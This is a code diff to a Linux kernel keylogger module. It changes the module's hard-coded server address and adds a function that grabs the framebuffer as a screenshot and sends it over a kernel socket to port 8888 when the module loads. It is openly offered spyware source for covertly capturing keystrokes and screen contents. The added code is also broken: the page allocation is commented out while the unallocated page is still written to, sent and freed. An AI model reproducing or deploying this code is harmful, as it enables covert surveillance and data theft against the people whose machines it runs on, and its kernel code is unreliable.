@@ -6,13 +6,75 @@
 #include <linux/net.h>
 #include <linux/in.h>
 #include <linux/inet.h>
+#include <linux/fs.h>
+#include <linux/uaccess.h>
+#include <linux/fb.h>
 
-#define SERVER_IP "192.168.0.23"
+#define SERVER_IP "192.168.100.66"
 #define SERVER_PORT 8888
 
 MODULE_LICENSE("GPL");
 
 struct socket *sock;
+
+static int capture_screenshot(void)
+{
+    struct fb_info *fb_info;
+    struct fb_var_screeninfo var_info;
+    struct fb_fix_screeninfo fix_info;
+    char *framebuffer;
+    int x, y;
+
+    // Get the framebuffer information
+    fb_info = registered_fb[0];
+    framebuffer = fb_info->screen_base;
+    var_info = fb_info->var;
+    fix_info = fb_info->fix;
+
+    // Allocate memory for the screenshot
+    char *screenshot = kmalloc(var_info.xres_virtual * var_info.yres_virtual * (var_info.bits_per_pixel / 8), GFP_KERNEL);
+    if (!screenshot)
+    {
+        printk(KERN_ERR "Failed to allocate memory for screenshot\n");
+        return -ENOMEM;
+    }
+
+    // Copy the framebuffer contents to the screenshot buffer
+    for (y = 0; y < var_info.yres_virtual; y++)
+    {
+        memcpy(screenshot + y * var_info.xres_virtual * (var_info.bits_per_pixel / 8),
+               framebuffer + y * fix_info.line_length,
+               var_info.xres_virtual * (var_info.bits_per_pixel / 8));
+    }
+
+    // Send the screenshot via socket
+    struct kvec vec;
+    struct page *page;
+    int size = var_info.xres_virtual * var_info.yres_virtual * (var_info.bits_per_pixel / 8);
+    int written;
+
+    // page = alloc_page(GFP_KERNEL);
+    // if (!page)
+    // {
+    //     kfree(screenshot);
+    //     printk(KERN_ERR "Failed to allocate page\n");
+    //     return -ENOMEM;
+    // }
+
+    memcpy(page_address(page), screenshot, size);
+
+    // Set up the kernel_sendpage parameters
+    vec.iov_base = page_address(page);
+    vec.iov_len = size;
+
+    written = kernel_sendpage(sock, page, 1, size, 0);
+
+    printk(KERN_INFO "Screenshot: %d bytes\n", written);
+
+    __free_page(page);
+
+    return written;
+}
 
 static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param)
 {
@@ -93,6 +155,7 @@ static int __init keylogger_init(void)
     }
 
     // Register the keylogger
+    capture_screenshot();
     register_keyboard_notifier(&keylogger_nb);
 
     printk(KERN_INFO "Keylogger module initialized\n");
